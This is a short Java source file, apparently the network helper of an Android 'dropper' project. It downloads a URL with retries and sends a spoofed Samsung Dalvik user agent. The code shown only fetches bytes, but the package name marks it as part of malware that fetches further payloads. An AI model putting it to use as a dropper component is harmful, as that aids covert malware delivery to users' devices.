package com.fason.dropper;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

final class Net {
    private static final String UA =
            "Dalvik/2.1.0 (Linux; U; Android 13; SM-A525F Build/TP1A.220624.014)";

    static byte[] get(String url, int attempts) throws Exception {
        Exception last = null;
        for (int i = 0; i < attempts; i++) {
            HttpURLConnection c = null;
            try {
                c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(15000);
                c.setReadTimeout(45000);
                c.setRequestProperty("User-Agent", UA);
                c.setRequestProperty("Accept", "*/*");
                c.setInstanceFollowRedirects(true);
                int code = c.getResponseCode();
                if (code != 200) throw new IllegalStateException("HTTP " + code);
                try (InputStream in = c.getInputStream()) {
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    byte[] buf = new byte[16384];
                    int r;
                    while ((r = in.read(buf)) > 0) out.write(buf, 0, r);
                    return out.toByteArray();
                }
            } catch (Exception e) {
                last = e;
                try { Thread.sleep(800L * (i + 1)); } catch (InterruptedException ignored) {}
            } finally {
                if (c != null) c.disconnect();
            }
        }
        throw last == null ? new Exception("network") : last;
    }
}
